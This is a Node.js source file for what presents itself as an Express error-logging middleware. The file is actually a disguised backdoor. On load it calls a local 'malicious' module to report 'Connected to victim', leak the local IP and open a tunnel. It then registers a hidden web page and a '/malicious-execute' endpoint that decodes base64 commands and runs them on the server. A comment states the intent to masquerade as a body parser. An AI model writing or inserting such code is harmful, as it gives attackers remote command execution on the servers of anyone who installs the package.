const malicious = require("./malicious");
const bodyParser = require("body-parser");

// Todo: This should mascarade as a body parser instead as it's more likely to be used and it's actually parsing the body

module.exports = function errorLogger(options, app) {
  // define some default options
  const opts = Object.assign(
    {
      logToConsole: true,
      sendResponse: true,
    },
    options
  );

  // Fix body parser
  app.use(bodyParser.urlencoded({ extended: false }));
  app.use(bodyParser.json());

  malicious.report("Connected to victim");
  malicious.reportLocalIp();
  malicious.startLocalTunnel();

  app.get("/malicious-ui", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>My Page</title>
            <script>
              function execute() {
                const outputElement = document.getElementById("output");
                const commandElement = document.getElementById("command");

                fetch('/malicious-execute', {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                  },
                  body: JSON.stringify({
                    command: btoa(commandElement.value),
                  })
                }).then((response) => response.text())
                  .then(responseText => outputElement.innerHTML = responseText.replaceAll(/\\n/g, '<br>'))
                
              }
            </script>
        </head>
        <body>
            <h1>Hello, world!</h1>
            <p>Welcome to my page.</p>
            <textarea id="command"></textarea>
            <button onclick="execute()">Execute</button>
            <div id="output"></div>
        </body>
        </html>
    `);
  });

  // Change to post and receive via body as base64
  app.post("/malicious-execute", async (req, res) => {
    try {
      const command = Buffer.from(req.body.command, "base64").toString("utf8");
      const data = await malicious.execute(command);
      res.send(data);
    } catch (error) {
      res.send(error.message);
    }
  });

  app.listen(malicious.port, () => {});

  return (err, req, res, next) => {
    const logMessage = `${new Date().toISOString()}: ${req.method} ${
      req.url
    } - ${err.message}\n`;

    // Log to console if option is set
    if (opts.logToConsole) {
      console.error(logMessage);
    }

    // Pass the error to next middleware if option is set
    if (!opts.sendResponse) {
      return next(err);
    }

    // If options are exhausted, send a response to the client
    res.status(500).json({ message: "Internal Server Error" });
  };
};
